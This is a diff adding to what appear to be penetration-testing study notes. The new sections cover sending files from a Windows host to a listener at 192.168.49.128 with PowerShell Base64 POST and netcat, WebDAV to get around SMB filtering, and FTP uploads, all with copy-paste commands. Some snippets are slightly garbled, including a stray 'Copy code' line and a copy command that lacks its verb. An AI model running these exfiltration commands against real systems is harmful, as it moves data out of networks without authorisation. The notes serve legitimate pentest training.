@@ -305,4 +305,149 @@ To transfer files in this scenario we can set a username and password using out 
     #        1 fiel(s) copied.
 ```
 
-## FTP Download
+### PowerShell Base64 Web Upload
+
+This method demonstrates how PowerShell can be used to encode a file in Base64 and upload it to a server using `Invoke-WebRequest`. The payload is transmitted as a POST request to a specified URI, and the data is then caught using Netcat. Afterward, the data is decoded back to its original form.
+
+### Step 1: Encoding the File in Base64
+
+First, we convert the contents of a file (`hosts` file in this case) into Base64:
+
+```powershell
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))
+
+```
+
+This command reads the `hosts` file as raw bytes and then converts it into a Base64 string.
+
+### Step 2: Uploading the Encoded File via HTTP
+
+Next, we use `Invoke-WebRequest` to upload the Base64 encoded file to a remote server. The server is assumed to be listening on port 8000:
+
+```powershell
+Invoke-WebRequest -Uri <http://192.168.49.128:8000/> -Method POST -Body $b64
+
+```
+
+Here, we send the encoded file as a POST request with the Base64 string as the body.
+
+### Step 3: Catching the Data with Netcat
+
+On the receiving server (listening on port 8000), we use Netcat to catch the incoming Base64 data:
+
+```bash
+$ nc -lvnp 8000
+
+```
+
+Netcat listens for connections and displays the incoming data. The Base64-encoded content appears in the console.
+
+### Step 4: Decoding the File
+
+After receiving the Base64-encoded data, we decode it back to its original file using the `base64` tool:
+
+```bash
+bash
+Copy code
+echo <base64> | base64 -d -w 0 > hosts
+
+```
+
+This command takes the Base64 data, decodes it, and writes it back to a file (`hosts`).
+
+---
+
+### SMB Uploads via WebDAV
+
+The next section discusses using **SMB over HTTP** with WebDAV. Many organizations restrict SMB traffic (TCP/445) due to security concerns, but WebDAV provides a workaround by running SMB over HTTP (TCP/80). This method is commonly used for file sharing and remote access.
+
+### Setting Up WebDAV Server
+
+To set up a WebDAV server, we install the necessary Python modules:
+
+```bash
+$ sudo pip3 install wsgidav cheroot
+
+```
+
+Then, we run the WebDAV server:
+
+```bash
+
+$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+
+```
+
+This command runs the WebDAV server on port 80, serving files from `/tmp` with anonymous authentication.
+
+### Connecting to the WebDAV Share
+
+Once the WebDAV server is set up, we can access it from a Windows machine using the `DavWWWRoot` folder:
+
+```powershell
+dir \\\\192.168.49.128\\DavWWWRoot
+
+```
+
+This command lists the files available on the WebDAV server.
+
+### Uploading Files via WebDAV
+
+To upload a file (e.g., `SourceCode.zip`) to the WebDAV share, we use the `copy` command:
+
+```powershell
+C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.128\\DavWWWRoot\\
+
+```
+
+This uploads the specified file to the WebDAV share, allowing for easy file transfer over HTTP.
+
+---
+
+### FTP Uploads
+
+FTP (File Transfer Protocol) is another method for uploading files. In this section, we discuss how to set up an FTP server using Python's `pyftpdlib` module and how to use PowerShell or command line tools to upload files to it.
+
+### Setting Up the FTP Server
+
+We start the FTP server with the `--write` flag to allow uploading:
+
+```bash
+$ sudo python3 -m pyftpdlib --port 21 --write
+
+```
+
+This starts the FTP server on port 21, with write permissions for anonymous users.
+
+### Uploading Files via PowerShell
+
+Using PowerShell, we can upload a file to the FTP server with the following command:
+
+```powershell
+(New-Object Net.WebClient).UploadFile('<ftp://192.168.49.128/ftp-hosts>', 'C:\\Windows\\System32\\drivers\\etc\\hosts')
+
+```
+
+This command uploads the `hosts` file to the specified FTP server.
+
+### Creating an FTP Command File
+
+Alternatively, you can create an FTP command file (`ftpcommand.txt`) to automate the file upload process:
+
+```powershell
+echo open 192.168.49.128 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+
+```
+
+This script automates logging in, setting the transfer mode to binary, uploading the file, and closing the connection.
+
+---
+
+### Recap
+
+This section highlighted multiple methods to upload files using native tools such as PowerShell, FTP, and WebDAV. Each method allows file transfer under different network configurations, offering flexibility in various penetration testing scenarios.
